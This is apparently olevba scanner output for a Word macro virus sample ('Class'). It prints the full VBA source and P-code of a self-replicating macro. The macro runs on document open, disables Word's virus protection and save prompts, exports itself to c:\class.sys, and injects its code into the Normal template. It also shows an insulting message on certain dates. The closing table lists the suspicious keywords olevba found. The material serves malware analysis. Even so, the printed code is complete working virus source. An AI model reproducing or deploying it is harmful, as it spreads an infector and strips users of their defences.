olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ew
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ew - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
On Error GoTo out
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
Options.VirusProtection = False
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
Options.SaveNormalPrompt = False
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
Options.ConfirmConversions = False
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
If nt < 70 Then
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
End If
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
host.codemodule.AddFromFile ("c:\class.sys")
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
With host.codemodule
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    For x = 1 To 4
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    .deletelines 1
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    Next x
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
End With
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
If nt < 70 Then
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    With host.codemodule
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    .replaceline 1, "Sub AutoClose()"
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    .replaceline 71, "Sub ToolsMacro()"
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    End With
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
End If
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
With host.codemodule
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    For x = 2 To 72 Step 2
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
    Next x
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
End With
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
out:
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
End Sub
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
Sub ViewVBCode()
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit
End Sub
'Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.ew
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6776 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #2:
' 	OnError out 
' Line #3:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #10:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #11:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #13:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #14:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #15:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #17:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #18:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #19:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #20:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #21:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #24:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #25:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #26:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "I Think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " is a big stupid jerk!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x0021 "VicodinES Loves You / Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #28:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #29:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #30:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #31:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #32:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #33:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #34:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #35:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #38:
' 	EndWith 
' Line #39:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #40:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #41:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #42:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #43:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #44:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #45:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #46:
' 	LitDI2 0x0047 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #47:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #48:
' 	EndWith 
' Line #49:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #52:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #53:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #54:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0048 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #55:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #56:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	Ld Application 
' 	MemLd Assistant 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #57:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #58:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #60:
' 	EndWith 
' Line #61:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #62:
' 	Label out 
' Line #63:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #64:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #65:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #66:
' 	EndSub 
' Line #67:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #68:
' 	FuncDefn (Sub ViewVBCode())
' Line #69:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #70:
' 	EndSub 
' Line #71:
' 	QuoteRem 0x0000 0x0044 "Ditry PC7/14/2000 4:42:04 PMHP LaserJet 4 on LPT1:sample1.docClippit"
' Line #72:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

